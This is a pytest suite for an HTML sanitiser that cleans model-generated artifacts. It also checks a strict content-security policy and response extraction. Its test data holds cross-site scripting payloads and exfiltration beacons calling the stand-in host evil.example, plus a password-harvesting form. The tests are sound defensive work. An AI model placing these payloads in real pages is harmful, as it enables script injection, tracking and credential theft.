"""Artifact sanitiser: the security boundary.

Generated HTML is untrusted input - the model writes it after reading a user
message and passages retrieved by similarity to that message. These tests are
adversarial by design and each names the attack it prevents.

Two of them are regressions: protocol-relative `url(//host)` and the argument
of a stripped `@import` both survived the first implementation, and would have
reached the browser had the CSP not been there as the second layer.
"""

from __future__ import annotations

import pytest

from app.skills.artifact import extract
from app.skills.sanitizer import CSP, sanitize_html, wrap_document

EXECUTION_MARKERS = ("<script", "javascript:", "onerror", "onclick", "onload")


# --------------------------------------------------------------------------
# Script execution
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("payload", "attack"),
    [
        ("<script>alert(1)</script><p>ok</p>", "inline script"),
        ('<img src=x onerror="alert(1)">', "error-handler script"),
        ('<div onclick="steal()">x</div>', "click-handler script"),
        ('<body onload="go()">x</body>', "load-handler script"),
        ('<a href="javascript:alert(1)">x</a>', "javascript: URL"),
        ('<a href="java\tscript:alert(1)">x</a>', "control-character smuggling"),
        ('<a href="JaVaScRiPt:alert(1)">x</a>', "case-varied scheme"),
        ("<svg><script>alert(1)</script></svg>", "script inside SVG"),
        ("<noscript><script>alert(1)</script></noscript>", "script inside noscript"),
        ('<div style="width:expression(alert(1))">x</div>', "CSS expression()"),
    ],
)
def test_script_execution_is_stripped(payload: str, attack: str) -> None:
    safe, _ = sanitize_html(payload)
    lowered = safe.lower()
    for marker in EXECUTION_MARKERS:
        assert marker not in lowered, f"{attack}: '{marker}' survived in {safe!r}"


def test_script_contents_are_removed_not_just_the_tag() -> None:
    """Unwrapping <script> would move the payload into the document body."""
    safe, _ = sanitize_html("<script>alert('pwned')</script><p>visible</p>")
    assert "pwned" not in safe
    assert "visible" in safe


# --------------------------------------------------------------------------
# Network egress / exfiltration
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("payload", "attack"),
    [
        ('<img src="https://tracker.example/p.gif">', "remote tracking pixel"),
        ('<div style="background:url(//evil.example/b)">x</div>', "protocol-relative CSS beacon"),
        ("<style>@import url(//evil.example/x.css);</style>", "CSS @import egress"),
        ('<div style="background:url(\'https://evil.example/x\')">x</div>', "quoted remote CSS url"),
        ('<link rel="stylesheet" href="https://evil.example/x.css">', "remote stylesheet"),
        ('<iframe src="https://evil.example"></iframe>', "nested frame"),
    ],
)
def test_network_egress_is_blocked(payload: str, attack: str) -> None:
    safe, _ = sanitize_html(payload)
    assert "evil.example" not in safe, f"{attack} survived: {safe!r}"
    assert "tracker.example" not in safe, f"{attack} survived: {safe!r}"


def test_credential_harvesting_form_is_removed_with_its_contents() -> None:
    safe, _ = sanitize_html(
        '<form action="https://evil.example"><input type="password" name="pw"></form>'
    )
    assert "<form" not in safe.lower()
    assert "<input" not in safe.lower()
    assert "evil.example" not in safe


# --------------------------------------------------------------------------
# What must survive - a sanitiser that eats content is also a failure
# --------------------------------------------------------------------------


def test_document_markup_survives_intact() -> None:
    source = (
        "<h1>Title</h1><p>Body with <strong>bold</strong> and <em>italics</em>.</p>"
        "<ul><li>One</li><li>Two</li></ul>"
        "<table><thead><tr><th>A</th></tr></thead><tbody><tr><td>1</td></tr></tbody></table>"
    )
    safe, report = sanitize_html(source)

    for fragment in ("<h1>", "<strong>", "<ul>", "<table>", "<th>", "Title", "One"):
        assert fragment in safe
    assert report.modified is False


def test_safe_styling_survives() -> None:
    safe, _ = sanitize_html('<div style="color:#333;padding:8px;font-weight:600">x</div>')
    assert "color:#333" in safe
    assert "padding:8px" in safe


def test_inline_data_images_survive_but_remote_ones_do_not() -> None:
    inline = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="chart">'
    safe, _ = sanitize_html(inline)
    assert "data:image/png;base64" in safe
    assert 'alt="chart"' in safe

    remote, _ = sanitize_html('<img src="https://example.com/x.png">')
    assert "example.com" not in remote


def test_links_survive_but_are_neutralised() -> None:
    safe, _ = sanitize_html('<a href="https://lennysnewsletter.com/p/x">read</a>')
    assert 'href="https://lennysnewsletter.com/p/x"' in safe
    # Severing the opener prevents reverse tabnabbing.
    assert 'rel="noopener noreferrer nofollow"' in safe
    assert 'target="_blank"' in safe


def test_unknown_tags_are_unwrapped_so_their_text_is_kept() -> None:
    safe, report = sanitize_html("<marquee>important text</marquee>")
    assert "important text" in safe
    assert "marquee" in report.removed_tags


# --------------------------------------------------------------------------
# Robustness
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "payload",
    [
        "<div><p>unclosed",
        "<<<>>>",
        "<p>text</div></span>",
        "",
        "plain text with < and > and & symbols",
        "<div " * 200,
    ],
)
def test_malformed_input_never_raises(payload: str) -> None:
    safe, _ = sanitize_html(payload)
    assert isinstance(safe, str)


def test_text_is_escaped_so_it_cannot_become_markup() -> None:
    safe, _ = sanitize_html("<p>1 < 2 && 3 > 2</p>")
    assert "&lt;" in safe and "&gt;" in safe and "&amp;" in safe


# --------------------------------------------------------------------------
# The wrapped document
# --------------------------------------------------------------------------


def test_wrapped_document_carries_a_locked_down_csp() -> None:
    doc = wrap_document("<p>hi</p>", "My title")

    assert "default-src 'none'" in doc
    assert "form-action 'none'" in doc
    assert "frame-ancestors 'none'" in doc
    assert CSP in doc
    assert doc.lstrip().lower().startswith("<!doctype html>")


def test_wrapped_document_escapes_its_title() -> None:
    doc = wrap_document("<p>hi</p>", '<script>alert(1)</script>')
    assert "<title><script>" not in doc
    assert "&lt;script&gt;" in doc


# --------------------------------------------------------------------------
# Extraction - the path a real model response takes
# --------------------------------------------------------------------------


def test_extracts_fenced_html_and_sanitises_it() -> None:
    response = (
        "TITLE: Growth Playbook\n"
        "```html\n"
        '<h1>Growth Playbook</h1><script>alert(1)</script><p>Loops compound [2].</p>\n'
        "```"
    )
    artifact = extract(response, preferred_kind="html")

    assert artifact.kind == "html"
    assert artifact.title == "Growth Playbook"
    assert "<script" not in artifact.content.lower()
    assert "Loops compound [2]." in artifact.content
    assert artifact.report.modified is True
    assert artifact.format_honoured is True


def test_extracts_fenced_markdown() -> None:
    response = "TITLE: Notes\n```markdown\n# Notes\n\n- One [1]\n```"
    artifact = extract(response, preferred_kind="markdown")

    assert artifact.kind == "markdown"
    assert artifact.title == "Notes"
    assert "- One [1]" in artifact.content


def test_preamble_is_never_used_as_a_title() -> None:
    """Regression: llama3.2 opens with 'Here is a possible ...' and that became
    the artifact title, which read as a bug to anyone looking at the panel."""
    response = "Here is a possible HTML one-pager summarising the topic:\n\n**What Makes a Great PM?**\n\nProse."
    artifact = extract(response, preferred_kind="html")

    assert not artifact.title.lower().startswith("here is")
    assert artifact.title == "What Makes a Great PM?"


def test_unfenced_response_is_flagged_for_retry() -> None:
    artifact = extract("Just some prose, no fence at all.", preferred_kind="html")
    assert artifact.format_honoured is False


def test_commentary_outside_the_fence_is_kept_separately() -> None:
    response = "Here's the doc you asked for.\n```markdown\n# Doc\n```\nLet me know."
    artifact = extract(response, preferred_kind="markdown")

    assert artifact.content.strip() == "# Doc"
    assert "Let me know" in artifact.commentary
